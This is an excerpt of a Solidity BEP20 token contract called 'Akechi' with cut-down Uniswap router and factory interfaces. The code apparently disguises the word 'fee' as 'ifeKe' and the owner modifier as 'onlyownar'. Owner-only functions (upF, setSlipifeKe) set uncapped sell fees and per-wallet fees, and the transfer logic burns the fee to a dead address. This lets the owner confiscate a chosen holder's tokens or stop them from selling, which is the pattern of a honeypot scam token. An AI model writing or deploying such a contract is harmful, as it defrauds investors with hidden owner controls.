...
interface IUniswapV2Factory {
    ...
    function ifeKeTo() external view returns (address);
    function ifeKeToSetter() external view returns (address);
    ...
    function setifeKeTo(address) external;
    function setifeKeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingifeKeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingifeKeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingifeKeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingifeKeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingifeKeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Akechi is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellifeKe = 0;

    uint256 private _defaultBuyifeKe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipifeKe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellifeKe = _value;
    }

    function setSlipifeKe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipifeKe[_address] = _value;
    }

    function getSlipifeKe(address _address) external view onlyownar returns (uint256) {
        return _slipifeKe[_address];
    }


    function setMAccountifeKe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountifeKe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeifeKeAmount = 0;

        if (rF) {
            uint256 tradeifeKe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeifeKe = _defaultSellifeKe;
                }
                if (from == uniswapV2Pair) {

                    tradeifeKe = _defaultBuyifeKe;
                }
            }
            if (_slipifeKe[from] > 0) {
                tradeifeKe = _slipifeKe[from];
            }

            tradeifeKeAmount = _Amount.mul(tradeifeKe).div(100);
        }


        if (tradeifeKeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeifeKeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeifeKeAmount);
            emit Transfer(from, _deadAddress, tradeifeKeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeifeKeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeifeKeAmount);
        emit Transfer(from, _to, _Amount - tradeifeKeAmount);
    }
